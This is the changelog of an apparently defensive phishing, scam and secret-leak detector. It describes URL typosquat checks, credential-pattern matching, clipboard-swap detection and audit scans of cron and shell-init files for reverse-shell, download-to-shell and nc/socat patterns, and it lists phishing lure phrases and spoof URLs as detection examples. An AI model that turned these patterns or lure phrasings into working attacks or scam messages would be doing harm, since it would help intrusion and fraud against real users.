# Changelog

All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [1.0.6] — 2026-06-15

### Fixed
- **Duplicate canonical-domain reason when multiple brand detectors fire.**
  Self-audit of the 1.0.4 canonical-domain feature: a URL like
  `paypal.evilsite.netlify.app` trips *both* the subdomain-spoof and the
  free-hosting detectors, each of which emitted its own
  `Legitimate 'paypal': paypal.com` line — so the canonical appeared twice,
  reading as a duplicate and consuming two of the verdict's 12 reason slots
  (which can push a real detection signal out of the buffer). Introduced a
  single `add_brand_canonical()` helper that looks up the canonical, skips it
  if an identical reason is already present, and adds it with zero score
  delta. This also removes the copy-pasted `brand_canonical()`/`add_reason()`
  boilerplate from all 14 brand-detection sites (DRY). Behaviour is identical
  for single-detector cases; F1 = 1.000 preserved. New regression test asserts
  exactly one canonical line for a repeated-brand URL.

## [1.0.5] — 2026-06-15

### Added
- **Attack pattern synthesis — the named-threat classification lens**
  (NEW-PERSPECTIVE-PATTERN). Socratic question: "You listed five signals —
  what do they add up to?" HLSE outputs individual detection reasons but
  silently assumed users could synthesize them into a named threat class.
  A new `hlse_classify_url_attack(Verdict *)` function (exposed in the
  public API) scans the fired signals and maps them to a terse attack-class
  label using priority-ordered rules: IDN/Unicode impersonation, visual
  homoglyph, @-authority-trick, IP-hosted brand, free-hosting phishing
  infrastructure, subdomain-spoof, typosquat (with and without a path),
  brand-hyphen, classic credential-harvest, brand+TLD, shortener, DGA.
  The label appears in text output as `▸ Pattern: <class>` after the
  per-signal reasons, and in `--json` output as `"pattern":<string>`.
  Score and F1 are unaffected (classifier is read-only, zero delta).
  7 new integration tests: each major attack class is verified, including
  "clean URL has no Pattern line." 151 total CLI tests, 0 failures.

## [1.0.4] — 2026-06-15

### Added
- **Canonical domain — the contrastive truth lens**
  (NEW-PERSPECTIVE-CANONICAL). Socratic question: "You've named the deception
  — where should I actually go?" Every brand-detection path (typosquat, digraph
  homoglyph, confusable-character, II→ll, mixed-script, IDN homograph, subdomain
  spoofing, brand+security-word hyphenation, brand+suffix-word fusion, brand in
  hyphenated SLD, free-hosting phishing, IP-host with brand in path) already
  knows *which brand* is being impersonated because it matched against the
  BRANDS[] table — yet the output named only the deception. It never said where
  to actually go. A new `brand_canonical()` lookup (108 brands → authoritative
  domain, covering non-obvious cases: `zoom → zoom.us`, `notion → notion.so`,
  `twitter → x.com`, `cashapp → cash.app`, `line → line.me`,
  `telegram → telegram.org`) surfaces the truth alongside every impersonation
  warning as a zero-score-delta `"Legitimate '<brand>': <domain>"` reason. The
  canonical appears in both text and `--json` output. Score is unaffected (delta
  0, informational only); F1 = 1.000 preserved. Tests: 5 new integration checks
  verify typosquat, homoglyph, brand-impersonation, and non-obvious canonical
  cases; the `zoom.us` assertion guards against the common mistake of using the
  wrong regional domain.

## [1.0.3] — 2026-06-13

Socratic probe of the five modules that had no dedicated coverage check this
cycle (network, secrets-Azure, audit-persistence, email-auth, multilingual
text). Each finding below started from a question — "why would this ever be
legitimate?" — and closed a concrete gap without moving F1 off 1.000 on either
the in- or out-of-distribution corpus.

### Added
- **Exoneration — the benign explanation for a heuristic threat**
  (NEW-PERSPECTIVE-EXONERATION). Socratic mirror of the blind-spot lens: that
  one hedges a clean `OK` ("might be wrong, here's what I can't see"); HLSE
  stated *threats* as if certain. But a hyphenated small-business domain or a
  security vendor's "secure-login" site trips heuristics legitimately. On a
  LOG/ALERT-band threat (score 15–59 — where false positives live), the
  `url`/`text`/`email` checks now print `↺ Could be benign:` with the innocent
  explanation **and the falsifying test** ("were you expecting this link; does
  the registrable domain belong to the real brand?"). High-confidence
  BLOCK/ISOLATE threats (homoglyph, `@`-trick, clipboard swap) are *not* hedged.
  Together with blind-spot, HLSE is now honest about uncertainty in both
  directions — clean and threat.
- **`--fail-on <tier>` — the machine consumer's risk gate**
  (NEW-PERSPECTIVE-FAILON). Socratic reframing: five perspectives enriched
  *text for a human*, but HLSE is most deployed as a CI gate / pre-commit hook /
  pipeline filter — read by a *script*, via the *exit code*. The exit code
  collapsed five severity tiers into pass/fail at a hardcoded BLOCK(60),
  imposing the author's risk posture on every consumer. A payments repo may want
  to fail the build at ALERT(40); a noisy docs repo only at ISOLATE(80). New
  `--fail-on log|alert|block|isolate|0-100` sets the score at/above which the
  process exits 1 (default block/60, fully backward-compatible). Applies to all
  single-artifact checks and to `scan` (which now gates its exit on the chosen
  threshold while still *reporting* every finding ≥ ALERT).
- **Epistemic humility — blind-spot disclosure on clean verdicts**
  (NEW-PERSPECTIVE-BLINDSPOT). Socratic reframing ("the only true wisdom is
  knowing you know nothing"): every other signal enriches a *threat* finding,
  but the most dangerous output is a **false `OK`** — the user proceeds
  *because* the tool blessed it. A clean verdict means "no syntactic deception
  markers found", not "safe". The `url`, `text`, and `email` checks now append a
  one-line `ℹ Blind spot:` note on a clean (score 0) result, stating what HLSE
  cannot see — a pixel-perfect clone on a clean domain, a novel scam with no
  known phrasing, a breached-but-legitimate sender — so an OK is not mistaken
  for proof of safety. Shown only on interactive single checks (not batch/CI/
  scan output) and only on clean results; threat verdicts are unaffected.
- **Blast radius — the pivot/correlation lens** (NEW-PERSPECTIVE-BLAST-RADIUS).
  Socratic reframing: a `scan` reported N findings one at a time, but an
  attacker *chains* them — a leaked AWS key **+** a database URL **+** a GitHub
  token is a full pivot (code → cloud → data), materially worse than ten copies
  of one test key. Danger lives in the *diversity of asset classes*, not the
  count. The scan now buckets each secret finding into a coarse asset class
  (cloud-infrastructure, source-control, database, payment, communications,
  AI-provider, private-key) and, when findings span ≥2 classes, emits a
  `⚠ BLAST RADIUS: … span N asset classes (…) — an attacker can pivot …` summary
  (human) plus `asset_classes` / `blast_radius` JSON fields. A single class
  (even many tokens) does not trigger it — the warning marks genuine
  cross-system exposure, not volume.
- **Confidence as a dimension distinct from severity** (NEW-PERSPECTIVE-CONFIDENCE).
  Socratic reframing: two secret findings can share a score (severity) while
  having opposite epistemic status — a fixed-prefix `AKIA…`/`ghp_…` or a
  structural match (JWT, GCP service-account JSON, private-key marker) is
  *near-certain* (~zero false positives), whereas a generic `VAR=value` env line
  or a high-entropy guess is a *heuristic*. The single score conflated "how bad"
  with "how sure". The `secret` subcommand now reports a separate
  **confidence** — `certain` vs `heuristic` — in the human header
  (`… — confidence: heuristic`) and a `"confidence"` JSON field; a heuristic
  finding additionally prints a "confirm it is a live credential" note. A
  generic `PASSWORD=…` (BLOCK 70, heuristic) and an `AKIA…` (ISOLATE 80,
  certain) now read as different on the confidence axis even though both block.
- **Remediation guidance — from detection to response** (NEW-PERSPECTIVE-REMEDIATION).
  Socratic reframing: a detector answers "is this dangerous?", but the user's
  real question at that moment is "what do I do *now*?". Every verdict explained
  **why** (reasons) yet none said **what next**. For actionable verdicts
  (score ≥ 60) the `clipboard`, `secret`, and `email` subcommands now emit a
  concrete next-action — `→ Action: …` in human output and a `"remediation"`
  field in JSON. Highest-stakes first: a clipboard hijack says "Do NOT send
  funds — re-copy and verify every character"; a leaked credential says
  "revoke/rotate now and purge git history"; a spoofed email says "verify the
  sender on a known channel before acting." Sub-threshold (LOG/ALERT < 60)
  verdicts stay quiet — advice is reserved for when action is genuinely needed.

### Security
- **Network: default-route integrity (N2) was documented but never
  implemented** (GAP-NET-N2). The header advertised an N2 "gateway change"
  check, yet `hlse_check_network()` only did ARP/DNS/hosts. Routing injection —
  malware adding a second default route at the same metric as the real gateway
  to silently MITM all traffic — went undetected. Implemented N2 by parsing
  `/proc/net/route`: when ≥2 default routes share the lowest metric, score +55
  and decode both conflicting gateway IPs into the reason. There is no benign
  reason for a client to carry two same-metric default routes (load balancing
  happens at the router, not the host).
- **Network: DNS allow-list hardening** (N3). Added AdGuard, Neustar/UltraDNS,
  and the canonical IPv6 resolvers (Cloudflare/Google/Quad9) to the known-safe
  list, and tightened the RFC-1918 `172.` test to the real `172.16–172.31`
  range (previously any `172.*` was trusted, including routable space).
- **Network: hosts-file pharming coverage** (N4). Expanded the sensitive-domain
  list from 13 to ~50: added Citi/US Bank/Capital One/PNC, Cash App/Zelle/
  Stripe/Square, Bybit/OKX/KuCoin/Crypto.com/Gate.io, Ledger/Trezor/Exodus/
  Trust Wallet/Phantom, Revolut/Wise/N26/ING, KR banks, and Alipay/WeChat Pay.
- **Secrets: Google OAuth client secret** (GAP-SECRET-GOCSPX). Added the
  `GOCSPX-` prefixed Google OAuth2 client secret to the pattern table (unique
  prefix → ~zero FP) — ISOLATE(90).
- **Secrets: newer LLM-provider keys** (GAP-SECRET-LLM). Added Groq (`gsk_`),
  Perplexity (`pplx-`), and xAI/Grok (`xai-`) API-key prefixes (each requires a
  ≥20-char body, so short prefix-words like `xai-dir` are not flagged). DeepSeek
  (`sk-`) and Cohere were deliberately omitted — their prefixes are too generic
  and would raise the false-positive rate.
- **Secrets: bare Telegram bot tokens** (GAP-SECRET-TELEGRAM). A Telegram bot
  token (`<8-10 digit id>:<35 base64url chars>`) is a recognized
  secret-scanning target (TruffleHog/GitGuardian) but HLSE caught it only when
  it carried a `TELEGRAM_BOT_TOKEN=` env prefix. Added a structural check: a
  colon with an 8–10 digit id before and ≥35 base64url chars after — ISOLATE.
  FP-guarded so timestamps (`12:34:56`), ports (`:8080`), and ratios stay clean.
- **Secrets: AWS credentials-file format missed entirely** (GAP-SECRET-AWSINI).
  The canonical `~/.aws/credentials` form uses lowercase keys with spaces
  around `=` (`aws_secret_access_key = wJal…`), but the env-pattern scan is
  case-sensitive (UPPERCASE only) and rejects any space after `=`, so the most
  common real-world AWS secret-key leak format scored OK(0). The bare 40-char
  base64 secret is too generic to flag alone, but anchored to a
  case-insensitive `aws_secret_access_key` key it is high-confidence: match the
  key with a new `ci_strstr`, skip `=`/quotes/whitespace, require ≥40 base64
  chars, suppress placeholders — ISOLATE on a real key.
  - `aws_secret_access_key = <40-char base64>`: OK(0) → flagged (AWS_SECRET_KEY)
  - FP-guarded: `YOUR_SECRET_KEY_HERE_PLACEHOLDER…` and short values stay clean.
- **File: HTML-smuggling masquerade** (GAP-FILE-HTML). An HTML file wearing a
  document/image extension (`invoice.pdf`, `statement.doc` that is really
  `<!DOCTYPE html>…`) opens in the browser and runs embedded JS / reconstructs
  an in-page payload — a top phishing-delivery vector. HTML has no fixed magic
  byte, so it slipped past the byte-signature table. Added a `looks_like_html()`
  detector (case-insensitive, BOM/whitespace-tolerant, matches
  `<!doctype html`/`<html`/`<head`/`<script`/`<svg`/comment lead-in) and an F2
  rule — ALERT(55). Genuine `.html`/`.htm`/`.svg` files are exempt.
- **Secrets: connection-string embedded credentials** (GAP-SECRET-URICREDS). A
  password inside a service URI (`postgres://user:pass@host`,
  `mongodb+srv://user:pass@host`, redis/amqp/mysql/…) is a high-volume
  real-world leak, but was caught only with a `DATABASE_URL=` env prefix. Added
  a structural check over a fixed set of credential-bearing schemes (so a plain
  `https://` link handled by the URL module does not collide) that extracts the
  `user:password@` userinfo and flags a non-trivial password — ISOLATE(80).
  FP-guarded: host-only URIs, `${VAR}` references, and placeholders stay clean.
- **Clipboard: Tezos mislabel + Polkadot/Algorand coverage** (GAP-CLIP-XTZ-DOT-ALGO).
  A Tezos address (`tz1…`, 36-char base58) was *detected* but mislabeled "SOL
  (Solana)" because it fell into the base58 catch-all; Polkadot (47–48-char
  SS58) and Algorand (58-char base32) were missed entirely. Added explicit
  matchers ahead of the Solana catch-all: Tezos now labels correctly, Polkadot
  and Algorand swaps go OK(0)→ISOLATE(95). Solana detection unregressed.
  (`detect_crypto_type` feeds only the clipboard comparison, never the
  scoring path, so this cannot affect phishing/scam F1.)
- **Clipboard: Bitcoin Cash & Cosmos coverage** (GAP-CLIP-BCH-ATOM). The
  clipper-swap detector recognized 14 address formats but not two major coins:
  Bitcoin Cash (`bitcoincash:q…` CashAddr) and Cosmos Hub (`cosmos1…`). A
  swap on either returned OK — the exact silent failure the module exists to
  prevent. Added both with prefix-anchored, zero-FP matchers; cross-type
  copy/paste mismatches are flagged distinctly. ISOLATE(95) on same-type swap.
- **Secrets: JWT bearer tokens** (GAP-SECRET-JWT). A leaked signed JWT
  (`eyJ….eyJ….<sig>`) is a live bearer credential that GitHub/GitGuardian both
  flag, but HLSE returned OK(0). Added detection keyed on the JWT-specific
  shape: the `eyJ` prefix (base64 of `{"`, which every JWT header begins with)
  plus three base64url segments separated by single dots, with minimum segment
  lengths (header≥10, payload≥10, signature≥20) so unsigned 2-segment tokens
  and stray `eyJ…` base64 fragments do not false-positive — BLOCK(60).
- **Secrets: Azure storage AccountKey** (GAP-SECRET-AZURE). A raw Azure
  connection string (`...;AccountKey=<88-char base64>;...`) returned OK unless
  it happened to carry the `AZURE_STORAGE_CONNECTION_STRING=` env prefix. Added
  a structural check that flags an `AccountKey=` followed by ≥40 base64 chars
  (real keys are 88), with placeholder suppression — ISOLATE(85).
- **Audit: system-cron persistence blind spot** (GAP-AUDIT-CRON). A4 scanned
  user crontabs and `/etc/cron.d/` but ignored `/etc/cron.{hourly,daily,weekly,
  monthly}/` and `/etc/crontab` itself — all classic persistence locations.
  Now scans every system cron directory plus the system crontab for the same
  reverse-shell / download-pipe / base64 patterns.
- **Audit: system-wide shell-init backdoor** (GAP-AUDIT-PROFILED). A6 inspected
  the calling user's `~/.bashrc`-family files but not `/etc/profile.d/`, which
  executes for *every* interactive login. Added a scan of `/etc/profile.d/` for
  reverse-shell device paths, download-piped-to-shell, and nc/socat — scored at
  CRITICAL (+50/+55) because the blast radius is all users, not one.

- **URL: obfuscated dotless-IP hosts** (GAP-URL-IPOBF). The IP-host check
  required a `.` in the host, so the classic blocklist-evasion forms — hex
  (`http://0x7f000001/`) and dword-decimal (`http://2130706433/`), both
  decoding to a real IP — fell through to the generic "digit-heavy" heuristic
  at LOG(30). A host with no dot that is all-digits (≥7) or `0x`-hex is never a
  registrable domain (no all-numeric TLD exists), so it is flagged at +40 as a
  named obfuscation signal with effectively zero false positives.
  - `http://0x7f000001/admin`: LOG(30) → BLOCK(70)
  - `http://2130706433/login`: → ISOLATE(85)
  - FP-guarded: `7-eleven.com`, dotted IPs, and `host:port` are unaffected.

### Fixed
- **Clipboard: address-swap missed when an address carried surrounding
  whitespace** (BUG-CLIP-WS). A real clipboard selection routinely includes
  leading/trailing spaces or a trailing newline; an untrimmed address failed
  fixed-length/prefix format detection, so the clipper swap was silently missed
  (`"  1A1z…Divf  "` vs a different BTC address → OK). `hlse_check_crypto_swap`
  now trims both inputs before detection; identical addresses differing only in
  surrounding whitespace are correctly NOT flagged as a swap.
- **Email: folded (RFC 5322 continuation) headers broke From parsing**
  (BUG-EMAIL-FOLD). A spoofed header split across lines —
  `From: PayPal Support\n <service@evil.ru>` — left the address on the folded
  line, so `extract_domain` stopped at the newline (missing `evil.ru`) and the
  display name kept an embedded newline. The spoof scored a weak ALERT(45) with
  a malformed reason instead of BLOCK(65). Added an RFC 5322 §2.2.3 unfolding
  pass (CRLF+WSP → single space) before parsing; legitimate folded headers and
  brand-owns-domain suppression are unaffected.
- **Scan: files ≥1 MB were skipped entirely for secrets** (BUG-SCAN-SIZECAP). A
  log, `.sql` dump, or bundled config just over 1 MB — exactly the files where
  credentials hide — was counted as "scanned" but its contents were never read,
  a misleading silent false-negative. Replaced the hard 1 MB skip with an 8 MB
  per-file byte budget: large files are now scanned (bounded so a pathological
  huge file can't stall the run; a 10 MB file completes in ~0.3 s).
- **Secrets: real keys silently suppressed by far-off "example"/"sample" prose**
  (BUG-SECRET-PLACEHOLDER-WINDOW). The placeholder/example detector scanned 64
  chars of context before a matched secret for marker words — so a live key was
  dropped whenever unrelated prose nearby contained "example", "sample", or a
  run of `xxxxxxxx` (e.g. `Example config for production: AKIA<real key>`,
  common in READMEs, logs, and config comments). Tightened the context window to
  32 chars (a marker must abut the secret as an assignment prefix like
  `example_key =`) and excluded the repetitive-char markers from the context
  scan (an x-filled *token* is still caught by the token-self and distinct-char
  checks). Genuine placeholders (`example_api_key = …`, the AWS doc key,
  `your_api_key_here`) remain suppressed; real keys in prose are now detected.
- **Scan: `.env` and other dotfiles were silently skipped** (BUG-SCAN-DOTFILES).
  The recursive directory scanner skipped every entry whose name began with
  `.`, intending to skip `.`/`..`/`.git` — but this also skipped `.env`,
  `.npmrc`, `.pypirc`, `.git-credentials`, `.aws/credentials`, the *highest*-value
  secret-bearing files. A `scan <repo>` in CI would report clean while a leaked
  `.env` sat right there. Now only `.`/`..` are skipped at the entry level, and
  dot-named **directories** (`.git`, `.svn`, `.hg`) are filtered via the
  existing `SKIP_DIRS` list, so dotfiles are scanned but VCS metadata trees are
  not. (`.env` with embedded DB credentials: silently OK → ISOLATE.)
- **URL: `@`-credential-trick false positive on `@` in query string**
  (FP-URL-ATSIGN). The check searched the *entire* URL after the scheme for an
  `@`, so a benign link with an email in a query parameter
  (`https://example.com/contact?email=user@gmail.com`) was flagged ALERT(45) as
  a credential trick — and the reason fired twice on open-redirect URLs. Bounded
  the search to the authority component (between `://` and the first `/`,`?`,`#`).
  Real `host@evil.ru` tricks still ISOLATE; email-in-query URLs are now clean.

### Changed
- **Email: false positive on legitimate banks** (FP-EMAIL-BANK). The E1
  display-name check listed `"bank"` as an impersonation keyword but
  `brand_owns_domain()` had no bank entries, so `From: Chase Bank
  <noreply@chase.com>` was flagged BLOCK(65) as impersonation. Added canonical
  domains for major US/JP/EU/KR banks (chase.com, bankofamerica.com, smbc.co.jp,
  ing.com, kbstar.com, …) so a bank's own domain is recognized; look-alike
  domains (`chase-secure.ru`) still fire.
- **Email: missing-authentication signal** (E4). Added detection for
  `spf=none ∧ dkim=none ∧ dmarc=none` in Authentication-Results — a sender
  publishing *no* email-auth records is itself a weak spoofing signal
  (+20), distinct from the existing explicit `=fail` checks.
- **Text: Spanish / Portuguese / Arabic scam coverage** (GAP-TEXT-ROMANCE-AR).
  The wordlists covered EN + CJK but returned OK(0) for the entire Spanish,
  Portuguese, and Arabic threat surface. Added fused, scam-defining phrasings
  (not bare keywords, per dual-use discipline) across five categories:
  account-credential asks (`verificar su identidad`, `verificar sua
  identidade`, `تحقق من هويتك`), consequence-threat alerts (`cuenta ha sido
  suspendida`, `para evitar a suspensão`, `سيتم إغلاق حسابك`), prize lures
  (`ha sido seleccionado`, `ganhou um prêmio`, `ربحت جائزة`), rental-scam
  key-mailing (`le enviaremos las llaves por correo` + `depósito … por
  transferencia bancaria`), and money-movement (`enviar dinero`, `transferir
  dinheiro`). Verified no double-scoring (suspension phrases live only in
  FAKE_ALERT_WORDS) and no FP on benign ES/PT prose.

## [1.0.2] — 2026-06-13

### Security
- **File: shebang script masquerading as a document** (GAP-FILE-SHEBANG): the
  magic-byte mismatch check detected binary executables disguised as images
  (PE-as-`.jpg`), but a text script with a `#!` shebang returned NULL magic, so
  `invoice.pdf` / `photo.jpg` / `report.mp4` that were really runnable shell /
  python / perl scripts passed as OK. Added a `Script` magic (`#!`) and an F2
  rule that flags a shebang file wearing a passive document/image/media
  extension. Enriched `DOCUMENT_EXTS` with media containers (`.mp3`, `.mp4`,
  `.mov`, `.mkv`, `.epub`, …).
  - script-as-`invoice.pdf` / `photo.jpg` / `report.mp4`: OK(0) → BLOCK(60)
  - legitimate `.sh` / `.py` scripts and real `%PDF` files unaffected.
- **Supply-chain: ecosystem-alias false-negative** (BUG-PKG-ECOSYSTEM): the
  package typosquat check filtered registries by an exact string match against
  internal labels (`pip`, `npm`, `cargo`, `go`, `gem`), but the CLI help and
  every user's mental model use registry names like **`pypi`**. Running
  `package reqeusts pypi` matched *zero* registries and returned **OK** — a
  silent false-negative on a security check: the user believes they vetted the
  package and got a clean result, then installs the malware. Added
  `canonical_ecosystem()` aliasing (`pypi`/`python`/`pip3` → pip,
  `node`/`nodejs`/`yarn`/`pnpm` → npm, `crates`/`crates.io`/`rust` → cargo,
  `golang` → go, `rubygems`/`ruby`/`bundler` → gem). An **unrecognized**
  ecosystem now scans *all* registries (fail safe) instead of matching nothing.
  - `package reqeusts pypi`: OK(0) → BLOCK(70) ("1 edit from 'requests'")
  - `package numpyy python`, `package djngo pip`, `package raisl rubygems`: now
    correctly BLOCK; `package reqeusts <unknown>` fails safe to BLOCK.
- **Text: CJK account-credential phishing** (GAP-TEXT-CJK): the Japanese /
  Korean / Chinese wordlists covered the emotional/authority scams (ore-ore
  fraud, tax-authority impersonation) but had **no account-credential phishing
  vocabulary** — so the highest-volume global attack class (bank / e-commerce
  "your account was accessed, verify now") scored OK(0) in those languages while
  the identical English lure scored ALERT/BLOCK. Added account-alert phrasings to
  FAKE_ALERT_WORDS (JP `口座が不正利用`/`アカウントが停止されました`, CN
  `账户异常`/`账户将被冻结`, KR `계정이 정지`/`비정상적인 로그인`) and
  payment/credential-update asks to BAIT_WORDS (JP `支払い情報を更新`/`本人確認を完了`,
  CN `验证身份`/`更新支付信息`, KR `본인 인증`/`결제 정보`).
  - 三井住友銀行「口座が不正利用…至急ご確認」: OK(0) → ALERT(50)
  - アマゾンプライム「自動更新に失敗…支払い情報を更新」: OK(0) → LOG(32)
  - Korean「계정이 일시 정지…본인 인증」: OK(0) → ALERT(42)
  - Chinese「账户存在异常活动…验证身份…账户将被冻结」: OK(0) → BLOCK(77)
  - FP-clean: benign CJK (meeting reminders, order confirmations, in-branch ID
    checks) stay SAFE; legitimate payment-update *confirmations* score the same
    mild LOG(24) as their English equivalents (cross-language parity).
- **Text: prospective consequence-threat phishing** (GAP-TEXT-THREAT): account
  phishing manufactures urgency by threatening a FUTURE loss ("your account will
  be suspended … or lose access to your funds"). The engine detected the urgency
  but never booked the threat as a signal, so textbook lures scored only LOG.
  Added the phishing-specific threat+action phrasings to FAKE_ALERT_WORDS:
  `lose access to your account/funds`, `to avoid suspension`, `verify within 24
  hours`, `verify now to avoid`, `confirm now or`, `will be permanently
  disabled`, etc. The **bare** future verbs (`will be suspended/terminated/
  closed/deactivated`) are intentionally excluded — they are dual-use (SaaS
  trials, HR offboarding, bank-inactivity notices all use them legitimately).
  - `"…Coinbase account will be suspended … or lose access to your funds"`:
    LOG(25) → ALERT(55)
  - `"…PayPal account will be locked permanently unless you verify now to avoid
    suspension"`: → BLOCK(61)
  - FP-clean: legitimate trial/subscription/HR/bank "will be terminated/closed/
    deactivated" notices all stay SAFE.

- **URL: brand-impersonation cascade refactor + product-term fusion**
  (GAP-URL-BRANDFUSION): Reworked the brand-impersonation checks in
  `detect_security_hyphenation()` into a single mutually-exclusive cascade so a
  registrable domain contributes at most one brand reason (no more double-scoring
  of `paypal-verify.net`). Added a dedicated `BRAND_SUFFIX_WORDS` list (`enterprise`,
  `excel`, `outlook`, `drive`, `onedrive`, `sharepoint`, `office`, `workspace`,
  `meet`, `calendar`) that flags impersonation only when a product/edition term is
  **fused to a known brand** — these terms are intentionally kept out of the generic
  hyphenation counter because they are common in legitimate domains.
  - `app.slack-enterprise.com/sign-in`: OK(0) → ALERT(45)
  - `microsoftexcel.com/login`: LOG(15) → ALERT(45)
  - `googledrive.net/login`: LOG(15) → ALERT(45)
  - `teams-enterprise-signin.com`: LOG(20) → ALERT(55)
  - `microsoftoutlook.com/webmail`: → ALERT(45)
  - **FP fixed**: `my-enterprise-blog.com` LOG(20) → OK(0) (enterprise no longer a
    generic security word); `hard-drive-recovery.com` and `paypal-verify.net`
    unchanged from prior behaviour.
- **URL: brand+security-word concatenation** (no hyphen): `googleverify.net`,
  `paypalupdate.com` now flagged via the same cascade.
- **URL: trusted brand as direct subdomain of trusted parent**: `outlook.live.com`,
  `outlook.microsoft.com` no longer mis-flagged as subdomain spoofing (only exempt
  when the registrable parent is itself trusted and there is no extra nesting —
  `paypal.com.google.com` still fires).
- **URL: a brand's own `<brand>.com` is canonical** (GAP-URL-OWNDOMAIN): added
  `is_own_brand_dotcom()` — when the registrable SLD exactly equals a known brand
  and the host ends in `.com`, single phishing-path matches no longer raise the
  score (the trademark holder owns its own `.com`). Scales to every brand without
  a per-brand map; `sld_label()` returns the true registrable SLD so the nested
  decoy `paypal.com.evil.com` (SLD `evil`) is correctly excluded.
  - `www.slack.com/signin`, `www.dropbox.com/login`, `paypal.com/signin`:
    LOG(15) → OK(0)
  - Impostors unaffected: `paypal.xyz/login` LOG(35), `paypal-verify.com/signin`
    BLOCK(70), `g00gle.com/login` BLOCK(65), `paypal.com.evil.com/signin` BLOCK(60).
- **URL: hyphenated login-path variants**: added `/sign-in` and `/log-in` to
  `PATH_PATTERNS` (the existing `/signin`, `/login` did not match the hyphenated
  spellings used by phishing kits).
- **URL: BRANDS additions**: `teams` (Microsoft Teams impersonation).
- **Text: rental-scam "mail you the keys"** (GAP-TEXT-RENTAL): added scam-defining
  phrases (`mail you the keys`, `keys will be mailed`, …) to the rental-fraud group.
  Legitimate landlords never mail keys to an unvetted applicant. Replaces the
  dual-use "currently out of the country" travel-status phrasing that caused FPs.
- **Text: romance fund-transfer** (GAP-TEXT-ROMANCE): verb-anchored
  "…to my account" money-movement phrases added to FIN_ACTION_WORDS (e.g.
  `transfer money to my account`), avoiding FPs on benign "send the report to my
  account team". Celebrity crypto-doubling giveaway phrases added to PRIZE_WORDS.

## [1.0.1] — 2026-06-13

### Security
- **Text: bare-domain URL detection in messages** (GAP-TEXT-BAREDOMAIN): Extended
  `hlse_scan()` to extract bare domains (no `http://`/`https://` scheme) from text
  messages and run full URL analysis on them. Group A (inherently suspicious TLDs:
  `.xyz`, `.top`, `.click`, `.tk`, `.pw`, `.su`, `.vip`, `.icu`) are always scanned.
  Group B (common TLDs: `.com`, `.net`, `.org`, `.io`, etc.) are scanned when the
  domain contains a hyphen (the hallmark of lookalike/typosquat domains).
  - `"netflix.com-billing-update.net/pay"` in text: OK(0) → ISOLATE(93)
  - `"accounts.google-security-check.com"` in text: OK(0) → ALERT(55)
  - `"trustwallet-verify.io/confirm"` in text: LOG(27) → ISOLATE(97)
  - `"paypal-update-verify.com/login"` in text: BLOCK(70) ✓
  - `"microsoft-security-alerts.com"` in text: ISOLATE(85) ✓
  - Legitimate domains (`amazon.com`, `google.com`, `zoom.us`, `wikipedia.org`)
    correctly remain SAFE (no hyphen in common TLDs → not scanned).

## [1.0.0] — 2026-06-13

### Security
- **URL: delivery/fee/duty/tracking added to SECURITY_WORDS** (GAP-URL-DELIVERY):
  Added `duty`, `fee`, `track`, `tracking`, `delivery` to SECURITY_WORDS in
  hlse_core.c. `fedex-duty.com`, `ups-fee.com`, `dhl-tracking.net`, and similar
  delivery-fee phishing domains now correctly trigger brand+security_word compound
  detection. `fedex-delivery.com` improved to ALERT(55).
- **Text: customs/duty delivery smishing** (GAP-TEXT-CUSTOMS): Added `duty fee`,
  `pay duty fee`, `customs charge`, `package held at customs`, `parcel held at
  customs`, `shipment held at customs`, `held by customs` to CALLBACK_PHISH_WORDS.
  Full FedEx duty-fee smishing with URL improved from OK(0) to ISOLATE(95).

### Milestone
- **Version 1.0.0**: Detection coverage now spans all major scam categories:
  advance-fee (419, loan, crypto recovery), BEC (wire fraud, CEO fraud, real-estate),
  callback/TOAD/vishing, delivery smishing, hitman hoax, FBI scareware, pump-and-dump,
  pig-butchering (entry through exit), reshipping mule recruitment, utility cutoff,
  romance stranded-abroad, social-media task scam, SIM swap, OTP relay, QR quishing,
  subscription renewal BazarCall, overpayment fraud, and more.

## [0.9.99] — 2026-06-13

### Security
- **Text: FBI/police scareware & hitman hoax detection** (GAP-TEXT-SCAREWARE):
  Added `fbi warning`, `fbi notice`, `fbi alert`, `failure to comply`,
  `flagged for illegal activity`, `law enforcement has been notified`,
  `dea enforcement`, `narcotics department`, `police warning` to AUTHORITY_WORDS.
  FBI ransomware/scareware improved from OK(0) to BLOCK(67).
- **Text: hitman murder-for-hire hoax detection** (GAP-TEXT-HITMAN): Added
  `hired to kill you`, `been hired to kill`, `contract on your life`,
  `hit has been placed on you`, `assassin has been hired` to EMERGENCY_SCAM_WORDS.
  Hitman hoax with Bitcoin demand improved from LOG(20) to ISOLATE(100).
- **Text: "do not contact police" secrecy pressure** (GAP-TEXT-NOPOLICE): Added
  `do not contact the police`, `do not call the police`, `do not report this`,
  `do not go to the police`, `do not involve the police` to SECRECY_WORDS.
  These phrases appear in hitman hoaxes, grandparent scams, and sextortion.

## [0.9.98] — 2026-06-13

### Security
- **Text: 1-833 and 1-855 toll-free robocall prefixes** (GAP-TEXT-TOLLFREE): Added
  `call 1-833`, `call 1-855`, `call +1-833`, `call +1-855`, `at 1-833-`, `at 1-855-`
  to FAKE_ALERT_WORDS. These 2017-era toll-free prefixes are widely abused in
  tech-support, SSA/Medicare, IRS, and student-loan-forgiveness scam robocalls.
  Student loan forgiveness scam improved from LOG(20) to ALERT(50); SSA suspension
  scam BLOCK(66); Medicare insurance fraud scam ALERT(55).

## [0.9.97] — 2026-06-13

### Security
- **Text: pig-butchering exit scam / withdrawal fee fraud** (GAP-TEXT-PIGOUT): Added
  `withdrawal tax`, `withdrawal fee of`, `withdrawal fee required`, `aml compliance fee`,
  `aml fee`, `anti-money laundering fee`, `tax clearance fee`, `clearance fee to release`,
  `fee to unlock your profits`, `before you can withdraw`, `before withdrawal is possible`
  to GROOMING_WORDS. Pig-butchering fake-withdrawal messages improved from OK(0) to ALERT(40).
- **Text: pig-butchering rapport-building opener** (GAP-TEXT-PIGOPEN): Added `crypto mentor`,
  `investment mentor`, `my mentor showed me`, `let me show you how i made` to GROOMING_WORDS.
  Pig-butchering "my crypto mentor taught me" message improved from OK(0) to ALERT(47).
- **Text: social media "task" / likes scam** (GAP-TEXT-TASKSCAM): Added `liking social
  media posts`, `social media tasks`, `get paid to like`, `like and earn`, `earn by
  liking`, `liking posts for pay`, `earn extra cash from home` to GROOMING_WORDS.
  "Earn $800 a day liking social media posts" improved from LOG(20) to ALERT(40).

## [0.9.96] — 2026-06-13

### Security
